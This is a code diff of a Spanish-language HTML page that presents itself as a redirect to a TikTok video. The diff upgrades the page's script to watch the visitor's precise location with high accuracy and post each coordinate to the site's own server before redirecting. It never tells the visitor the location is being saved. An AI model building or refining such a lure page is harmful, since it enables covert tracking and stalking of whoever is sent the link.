@@ -1,33 +1,53 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Redireccionando...</title>
-    <meta charset="UTF-8" />
-    <script>
-      // Obtener ubicación y enviarla al servidor
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          fetch("/guardar-ubicacion", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              lat: position.coords.latitude,
-              lon: position.coords.longitude,
-            }),
-          }).finally(() => {
-            // Luego redirige a TikTok
-            window.location.href = "https://vt.tiktok.com/ZShV6fBpq/";
-          });
+<head>
+  <title>Redireccionando con ubicación precisa...</title>
+  <meta charset="UTF-8" />
+</head>
+<body>
+  <p>Obteniendo ubicación precisa, espera...</p>
+
+  <script>
+    let firstSent = false;
+
+    function enviarUbicacion(lat, lon) {
+      return fetch("/guardar-ubicacion", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ lat, lon }),
+      });
+    }
+
+    if (navigator.geolocation) {
+      const watchId = navigator.geolocation.watchPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          enviarUbicacion(lat, lon).then(() => {
+            if (!firstSent) {
+              firstSent = true;
+              // Redirigir después de enviar la primera ubicación
+              window.location.href = "https://vt.tiktok.com/ZShV6fBpq/";
+              // Si quieres que siga actualizando sin redirigir, comenta la línea anterior
+            }
+          }).catch(console.error);
         },
         (err) => {
-          console.error("Error obteniendo ubicación", err);
-          // Redirige incluso si falla la ubicación
+          alert("Error al obtener ubicación: " + err.message);
+          // Redirige igual si hay error
           window.location.href = "https://vt.tiktok.com/ZShV6fBpq/";
+        },
+        {
+          enableHighAccuracy: true,
+          maximumAge: 0,
+          timeout: 10000,
         }
       );
-    </script>
-  </head>
-  <body>
-    <p>Espera un momento...</p>
-  </body>
+    } else {
+      alert("Tu navegador no soporta geolocalización.");
+      window.location.href = "https://vt.tiktok.com/ZShV6fBpq/";
+    }
+  </script>
+</body>
 </html>
